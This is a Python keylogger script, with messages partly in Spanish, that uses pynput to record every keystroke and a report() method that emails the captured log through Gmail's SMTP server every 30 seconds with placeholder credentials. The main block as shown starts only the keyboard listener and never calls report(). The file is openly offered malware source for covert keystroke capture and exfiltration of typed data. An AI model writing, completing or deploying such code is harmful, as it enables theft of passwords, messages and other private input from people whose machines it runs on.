#!/usr/bin/env python3

import pynput.keyboard
import signal
import smtplib
import sys
import threading

from email.mime.text import MIMEText
from termcolor import colored

def def_handler(sig, frame):
    print(colored("\n[!] Saliendo del programa..!", 'red'))
    keylogger.shutdown()
    sys.exit(1)


class Keylogger:
    def __init__(self):
        self.log = ""
        self.request_shutdown = False
        self.timer = None
        self.is_first_run = True

    def preseed_key(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            special_keys = {
                pynput.keyboard.Key.space: "[Space]",
                pynput.keyboard.Key.backspace: "[Backspace]",
                pynput.keyboard.Key.enter: "[Enter]",
                pynput.keyboard.Key.shift: "[Shift]",
                pynput.keyboard.Key.alt: "[Alt]",
                pynput.keyboard.Key.ctrl: "[Ctrl]",
                pynput.keyboard.Key.tab: "[Tab]",
                pynput.keyboard.Key.caps_lock: "[Caps Lock]",
                pynput.keyboard.Key.esc: "[Esc]",
            }

            if hasattr(pynput.keyboard.Key, 'f1') and isinstance(key, pynput.keyboard.Key):
                if key.name.startswith('f'):
                    self.log += f" [{key.name.upper()}] "
            else:
                self.log += special_keys.get(key, f"[{str(key)}] ")

    def send_email(self, subject, body, sender, recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ','.join(recipients)

        try:
            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
                smtp_server.login(sender, password)
                smtp_server.sendmail(sender, recipients, msg.as_string())

            print(colored(f"\n[+] Email sent successfully...!", 'blue'))

        except Exception as e:
            print(colored(f"\n[!] Error al enviar el correo: {e}", 'red'))

    def report(self):
        email_body = "[+] El Keylogger se ha iniciado exitosamente" if self.is_first_run else self.log

        self.send_email(
            "Keylogger Report", email_body, "test@test.com", ["test@test.com"], "fjkaws sdigfws fs asf"
        )

        self.log = ""

        if self.is_first_run:
            self.is_first_run = False

        if not self.request_shutdown:
            self.timer = threading.Timer(30, self.report)
            self.timer.start()

    def shutdown(self):
        self.request_shutdown = True

        if self.timer:
            self.timer.cancel()

    def start(self):
        try:
            with pynput.keyboard.Listener(on_press=self.preseed_key) as keyboard_listener:
                keyboard_listener.join()

        except Exception as e:
            print(colored(f"\n[!] Error: {e}", 'red'))


if __name__ == '__main__':
    keylogger = Keylogger()
    signal.signal(signal.SIGINT, def_handler)
    keylogger.start()
